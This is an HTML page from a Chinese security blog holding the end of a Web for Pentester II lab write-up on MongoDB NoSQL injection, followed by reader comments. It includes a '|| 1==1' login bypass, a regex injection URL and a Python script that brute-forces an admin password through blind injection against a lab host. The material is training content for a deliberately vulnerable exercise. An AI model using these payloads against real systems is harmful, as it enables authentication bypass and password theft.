&quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Mongodb</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">mongodb是应用很广泛的一种nosql数据库，虽然不用sql，但是同样存在安全问题。 放几个参考链接： </span><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" textvalue="owasp nosql injection" style="text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">owasp nosql injection</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">, </span><a href="http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html" target="_blank" textvalue="hacking node.js and mongodb" style="text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">hacking node.js and mongodb</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"> &nbsp; ,</span><a href="http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html" target="_blank" textvalue=" hacking node.js and mongodb2" style="text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);"> hacking node.js and mongodb2</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&nbsp;。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1. 在登录时，如果是mysql这种关系型的数据库，我们可以构造真值等式来绕过。如 or 1=1。 在nosql中同样可以， || 1==1 在nosql中相当于 or 1=1 在sql中。 那么我们可以这样绕过。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t017a01a9612ce5be63.png" title="t0153c0ad762094c6f1.png" alt="http://p1.qhimg.com/t0153c0ad762094c6f1.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2. 说实话，这个我也没解出来，在看了答案之后发现是这样的。 根据一点猜测(或者对应用的了解)，想必这里还有一个password字段。可以这样来猜测.&nbsp;</span></p><pre class="brush:plain;toolbar:false">url:&nbsp;http://localhost/mongodb/example2/?search=admin’&nbsp;&amp;&amp;&nbsp;this.password.match(/./)//+%00</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">其中最后的// 类似于sql中的-- 即注释作用。而%00 空字符也可以阻止后边的执行。 还可以加上正则中的 ^ $ 分别限定。 &nbsp;如果成功，则返回结果，如果false，则无结果返回。 脚本如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;nosql2():
&nbsp;&nbsp;&nbsp;&nbsp;strs&nbsp;=&nbsp;string.lowercase&nbsp;+&nbsp;string.uppercase&nbsp;+&nbsp;string.digits
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;http://10.108.40.237/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/^{}$/)//+%00&quot;
&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;char&nbsp;in&nbsp;strs:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;password&nbsp;+&nbsp;char
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;requests.get(url.format(tmp&nbsp;+&nbsp;&quot;.*&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;admin&quot;&nbsp;in&nbsp;html.text:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;+=&nbsp;char
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[-]&nbsp;find&nbsp;a&nbsp;char:{}&quot;.format(password)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;requests.get(url.format(password))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;admin&quot;&nbsp;in&nbsp;html.text:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;Done!&nbsp;password:{}&quot;.format(password)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</pre></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3369.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】Web for Pentester II练习题解 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3369" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/3x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="7740" user-name="flaring_" href="javascript:;">
                flaring_            </a>
                        <span class="comment-time">2017-01-09 23:30:56</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="7740">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7740" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">玩个瘠薄，滚回去玩你的瘠薄剑三</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01857c1978f2c4da10.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="390662405" class="response" data-bind-id="390662405" data-target="7637" user-name="聪明的狗子" href="javascript:;">
                聪明的狗子            </a>
                        <span class="comment-time">2017-01-05 16:52:14</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="390662405" data-target="7637">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7637" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">是哒~作者写的很认真~</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="356970816" data-target="7614">小虎</a> <span class="comment-time">2017-01-04 12:17:02</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="356970816" data-target="7614">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7614" data-type="comment">点赞</a></span>            </div>
            <p>入门学习使用不错，相比官方的course要详细</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01857c1978f2c4da10.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="390662405" class="response" data-bind-id="390662405" data-target="7636" user-name="聪明的狗子" href="javascript:;">
                聪明的狗子            </a>
                        <span class="comment-time">2017-01-05 16:52:00</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="390662405" data-target="7636">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7636" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">必须好，保质保量~</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="0" data-target="7623">明月落花_</a> <span class="comment-time">2017-01-04 19:10:38</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="7623">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7623" data-type="comment">点赞</a></span>            </div>
            <p>这个好</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/4x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="7623" user-name="明月落花_" href="javascript:;">
                明月落花_            </a>
                        <span class="comment-time">2017-01-04 19:10:38</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="7623">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7623" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">这个好</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/8x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="7622" user-name="阿峰私语" href="javascript:;">
                阿峰私语            </a>
                        <span class="comment-time">2017-01-04 18:50:36</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="7622">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7622" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">Repost</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/0x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="7616" user-name="你见过需要仰望的喵星人吗" href="javascript:;">
                你见过需要仰望的喵星人吗            </a>
                        <span class="comment-time">2017-01-04 12:31:06</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="7616">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7616" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">放假玩</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/0x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="7615" user-name="你见过需要仰望的喵星人吗" href="javascript:;">
                你见过需要仰望的喵星人吗            </a>
                        <span class="comment-time">2017-01-04 12:30:49</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="7615">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7615" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">放假玩</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="356970816" class="response" data-bind-id="356970816" data-target="7614" user-name="小虎" href="javascript:;">
                小虎            </a>
                        <span class="comment-time">2017-01-04 12:17:02</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="356970816" data-target="7614">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7614" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">入门学习使用不错，相比官方的course要详细</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3369" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
